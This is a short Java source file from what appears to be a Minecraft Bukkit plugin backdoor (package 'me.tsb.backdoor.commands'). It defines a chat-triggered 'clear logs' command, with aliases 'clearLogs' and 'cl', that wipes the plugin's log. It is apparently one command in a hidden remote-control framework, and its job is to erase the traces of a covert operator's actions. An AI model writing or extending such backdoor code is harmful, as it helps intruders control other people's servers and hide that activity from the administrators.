package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "clear logs",
        usage = {"<prefix> <command>"},
        description = "Clears the logs",
        aliases = {"clearLogs", "cl"})
public class ClearLogsCommand extends Command {

    public ClearLogsCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        Main.logger.clear();
    }
}
